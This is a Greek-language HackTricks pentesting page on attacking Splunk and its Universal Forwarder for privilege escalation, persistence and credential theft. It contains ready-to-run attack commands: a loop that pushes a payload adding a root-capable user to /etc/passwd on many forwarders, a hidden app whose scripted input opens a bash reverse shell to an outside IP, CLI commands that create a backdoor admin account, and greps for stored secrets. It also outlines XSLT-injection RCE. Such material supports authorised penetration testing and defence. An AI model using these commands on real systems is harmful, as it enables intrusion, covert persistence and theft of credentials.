# Splunk LPE και Persistence

{{#include ../../banners/hacktricks-training.md}}

Αν κατά την **enumerating** ενός machine **internally** ή **externally** βρείτε **Splunk running** (συνήθως **8000** για το web UI και **8089** για το management API), έγκυρα credentials μπορούν συχνά να μετατραπούν σε **code execution** μέσω εγκατάστασης app, scripted inputs ή management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Αν το Splunk εκτελείται ως **root**, αυτό συχνά οδηγεί άμεσα σε **privilege escalation**.<sup>[[1]](#references)</sup>

Αν χρειάζεστε μόνο το generic remote attack surface, enumeration ή το app-upload RCE path, δείτε:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Αν είστε **ήδη root** και το Splunk service δεν ακούει μόνο στο localhost, μπορείτε επίσης να κλέψετε **Splunk password hashes**, να ανακτήσετε **encrypted secrets** ή να εγκαταστήσετε ένα **malicious app** για να διατηρήσετε persistence τοπικά ή σε πολλαπλά forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Ενδιαφέροντα Τοπικά Αρχεία

Όταν αποκτήσετε πρόσβαση σε host που εκτελεί Splunk ή Splunk Universal Forwarder, αυτά είναι συνήθως τα πιο ενδιαφέροντα paths:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Important artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: τοπικοί χρήστες Splunk και password hashes.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: κλειδί που χρησιμοποιείται από το Splunk για την κρυπτογράφηση secrets που αποθηκεύονται σε αρκετά αρχεία `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: αρχικό αρχείο bootstrap του admin· χρήσιμο σε gold images και provisioning mistakes. Αγνοείται αν υπάρχει ήδη το `etc/passwd`.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: σημείο όπου συνήθως ενεργοποιούνται scripted inputs.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** ή **`$SPLUNK_HOME/etc/apps/`**: κατάλληλα σημεία για την απόκρυψη ενός persistent app ή για τον έλεγχο όσων διανέμονται ήδη.<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

Για περισσότερες λεπτομέρειες, δείτε [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτό είναι απλώς μια σύνοψη.<sup>[[1]](#references)</sup>

**Επισκόπηση του exploit:**
Ένα exploit που στοχεύει το Splunk Universal Forwarder (UF) επιτρέπει σε attackers που διαθέτουν το **agent password** να εκτελέσουν arbitrary code σε συστήματα όπου εκτελείται ο agent, θέτοντας δυνητικά σε κίνδυνο μεγάλο μέρος του περιβάλλοντος.<sup>[[1]](#references)</sup>

**Γιατί λειτουργεί:**

- Η υπηρεσία διαχείρισης του UF εκτίθεται συνήθως στη **θύρα TCP 8089**.<sup>[[6]](#references)</sup>
- Οι attackers μπορούν να κάνουν authenticate στο API και να δώσουν εντολή στον forwarder να εγκαταστήσει ένα **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- Το ίδιο primitive μπορεί να χρησιμοποιηθεί τοπικά για **LPE** ή απομακρυσμένα για **RCE**.<sup>[[5]](#references)</sup>
- Public tooling όπως το **SplunkWhisperer2** δημιουργεί αυτόματα το app bundle και μπορεί να προσαρμόζει payloads για Linux targets.<sup>[[5]](#references)</sup>

**Συνήθεις τρόποι ανάκτησης του password:**

- Cleartext credentials σε documentation, scripts, shares ή deployment automation.<sup>[[1]](#references)</sup>
- Password hashes μέσα στο `$SPLUNK_HOME/etc/passwd`, τα οποία ακολουθούνται από offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images ή provisioning leftovers, όπως το `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Επιπτώσεις:**

- Εκτέλεση κώδικα σε επίπεδο SYSTEM/root σε κάθε compromised host.<sup>[[1]](#references)</sup>
- Ανάπτυξη persistent apps, backdoors ή ransomware.<sup>[[1]](#references)</sup>
- Απενεργοποίηση ή tampering με telemetry πριν από την προώθηση των δεδομένων.<sup>[[1]](#references)</sup>

**Παράδειγμα εντολής για exploitation:**

Η αρχική αναφορά παρουσιάζει το ακόλουθο loop για την αποστολή ενός payload σε πολλαπλούς forwarders.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Διαθέσιμα public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence μέσω Scripted Inputs ή Malicious Apps

Αν έχετε **filesystem write access** ως `root`/`splunk` ή authenticated access για την εγκατάσταση apps, ένας πολύ αξιόπιστος μηχανισμός persistence είναι η τοποθέτηση ενός **custom app** με ένα **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Η τεκμηρίωση του Splunk αναμένει τα scripted inputs να βρίσκονται σε έναν κατάλογο app και να ενεργοποιούνται από το `inputs.conf`.<sup>[[10]](#references)</sup>

Τυπική διάταξη:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Ελάχιστο `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Γρήγορο Linux dropper (χρησιμοποιώντας αυτό το τεκμηριωμένο app layout):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Σημειώσεις:

- Το ίδιο trick λειτουργεί και στο **Universal Forwarder** χρησιμοποιώντας το `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Οι attackers συχνά ενσωματώνονται τροποποιώντας ένα legitimate add-on αντί να δημιουργούν ένα προφανώς malicious app.<sup>[[2]](#references)</sup>
- Σε έναν **deployment server**, η τοποθέτηση ενός malicious app μέσα στο `deployment-apps/` μετατρέπεται σε **fleet-wide persistence**, επειδή οι forwarders κάνουν poll, κατεβάζουν updated apps και συχνά κάνουν restart για να τα εφαρμόσουν.<sup>[[11]](#references)[[12]](#references)</sup>

## Κλοπή Διαπιστευτηρίων και Κατάληψη Διαχειριστή

Αν μπορείτε να διαβάσετε τα local files του Splunk, συνήθως υπάρχουν δύο καλοί στόχοι: η ανάκτηση **Splunk admin access** και η ανάκτηση **encrypted service credentials**.<sup>[[8]](#references)</sup>

### Password hashes και local users

Το Splunk αποθηκεύει τα local authentication data στο `etc/passwd`. Ανάλογα με το deployment, το cracking αυτού του αρχείου μπορεί να ανακτήσει έγκυρα credentials για το web UI και το management API.<sup>[[1]](#references)[[7]](#references)</sup>

Αν έχετε ήδη έγκυρα **admin** credentials και το Splunk χρησιμοποιεί το **native** authentication backend, το ίδιο το CLI μπορεί να χρησιμοποιηθεί για persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` και encrypted values

Το Splunk χρησιμοποιεί το `etc/auth/splunk.secret` για την προστασία ευαίσθητων τιμών που αποθηκεύονται σε πολλαπλά αρχεία ρυθμίσεων. Αν μπορέσετε να κλέψετε τόσο το **secret** όσο και τα σχετικά **`.conf` files**, συχνά μπορείτε να ανακτήσετε ή να επαναχρησιμοποιήσετε:<sup>[[8]](#references)</sup>

- shared secrets των forwarder/indexer, όπως το `pass4SymmKey`
- κωδικούς πρόσβασης private keys TLS, όπως το `sslPassword`
- credentials LDAP bind, όπως το `bindDNPassword`

Αυτό μπορεί να υποστηρίξει **lateral movement**, ακόμη και όταν το Splunk admin password δεν μπορεί να γίνει crack.<sup>[[8]](#references)</sup>

### Κατάχρηση του `user-seed.conf`

Το `user-seed.conf` χρησιμοποιείται μόνο κατά την πρώτη εκκίνηση ή όταν δεν υπάρχει το `etc/passwd`. Αυτό το καθιστά λιγότερο χρήσιμο σε ένα live box, αλλά ιδιαίτερα ενδιαφέρον σε:<sup>[[9]](#references)</sup>

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances όπου το Splunk επανεκκινείται αυτόματα

Σε αυτές τις περιπτώσεις, η τοποθέτηση ενός `HASHED_PASSWORD` που δημιουργήθηκε με το `splunk hash-passwd` σας παρέχει έναν αθόρυβο τρόπο να ανακτήσετε admin access μετά το redeployment.<sup>[[9]](#references)</sup>

## Κατάχρηση Splunk Queries

Για περισσότερες λεπτομέρειες, δείτε το [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Μια χρήσιμη πρόσφατη τεχνική είναι η κατάχρηση **user-supplied XSLT** σε ευάλωτες εκδόσεις του Splunk Enterprise, ώστε ένας authenticated account με χαμηλά privileges να μετατραπεί σε **OS command execution** ως ο χρήστης `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

High-level flow:<sup>[[3]](#references)[[4]](#references)</sup>

1. Κάντε authenticate στο Splunk.
2. Ανεβάστε ένα κακόβουλο **XSL** file μέσω της λειτουργικότητας preview/upload.
3. Κάντε το Splunk να κάνει render τα search results με το uploaded stylesheet από τον κατάλογο **dispatch**.
4. Χρησιμοποιήστε το XSLT payload για να γράψετε ένα file ή να ενεργοποιήσετε execution μέσω του search pipeline του Splunk, για παράδειγμα προσεγγίζοντας internal functionality όπως το `runshellscript`.

Το σημαντικό offensive takeaway είναι ότι αυτή η διαδρομή παρέχει **post-auth RCE χωρίς να απαιτείται app upload**. Στο Linux συνήθως σας δίνει πρόσβαση στον account **`splunk`**, ο οποίος παραμένει πολύτιμος επειδή συχνά είναι owner του application tree, μπορεί να διαβάσει secrets και μπορεί να τοποθετήσει persistent apps που επιβιώνουν από την απώλεια του shell.<sup>[[3]](#references)[[4]](#references)</sup>

Ένα representative path που χρησιμοποιείται κατά το exploitation είναι:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Αν το Splunk εκτελείται με υπερβολικά πολλά δικαιώματα ή αν ο χρήστης `splunk` έχει πρόσβαση σε επικίνδυνα scripts, εγγράψιμα service units ή κακούς κανόνες `sudo`, αυτό δημιουργεί μια καθαρή αλυσίδα **LPE**.

## References

- [1] [Κατάχρηση Splunk Forwarders για RCE και Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Προσοχή στο TraitorWare: Χρήση του Splunk για Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Ανάλυση του CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Αλλαγή προεπιλεγμένων τιμών](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Ανάπτυξη ασφαλών κωδικών πρόσβασης σε πολλούς servers](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Ρύθμιση scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Δημιουργία deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Πώς πραγματοποιούνται τα deployment updates](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Ρύθμιση χρηστών με το CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
